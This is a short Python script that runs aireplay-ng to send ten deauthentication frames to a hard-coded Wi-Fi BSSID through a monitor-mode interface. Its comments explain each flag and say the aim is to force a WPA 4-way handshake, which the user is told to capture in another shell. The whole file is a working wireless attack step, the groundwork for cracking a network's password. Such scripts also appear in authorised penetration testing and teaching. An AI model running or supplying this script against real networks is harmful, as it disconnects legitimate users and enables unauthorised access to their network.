import os, sys, time

bssid = "08:BE:AC:03:DC:2E"
mon_network_interface = "wlan0mon"

print("--------------")
print("Opening Aireplay to inject frames")
print("--------------")
# -0 for deauthentication
# 10 for the number of deauthentication packets to be sent
# -a for the bssid of the target network
cmd = "aireplay-ng -0 10 -a %s %s" %(bssid, mon_network_interface)
os.system(cmd)
#This command forces a 4-way handshake

print("--------------------------------------------------------------------")
print("Press CTL C when you see the WPA handshake appear in the other shell")
print("--------------------------------------------------------------------")


